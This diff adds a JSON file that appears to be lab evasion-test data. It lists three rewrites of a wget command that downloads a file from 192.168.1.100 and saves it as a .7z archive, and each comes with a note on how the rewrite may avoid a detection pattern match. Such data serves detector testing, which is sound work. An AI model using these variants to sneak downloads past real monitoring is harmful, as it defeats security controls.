@@ -1,0 +1,14 @@
+[
+  {
+    "output": "wget.exe --output-document=C:\\Lab\\out\\archive.7z http://192.168.1.100/file.txt",
+    "explanation": "Reordering: The '-O' flag is moved to '--output-document' which is an equivalent syntax, potentially avoiding the flag match."
+  },
+  {
+    "output": "wget.exe -O C:\\Lab\\out\\archive.7z http://192.168.1.100/file.txt",
+    "explanation": "Substitution: Replaced '--output-document' with '-O' which is an equivalent short option, potentially avoiding the flag match."
+  },
+  {
+    "output": "wget.exe http://192.168.1.100/file.txt -O C:\\Lab\\out\\archive.7z",
+    "explanation": "Reordering: The '-O' flag is placed after the URL, which may not trigger the same pattern match as the original command."
+  }
+]
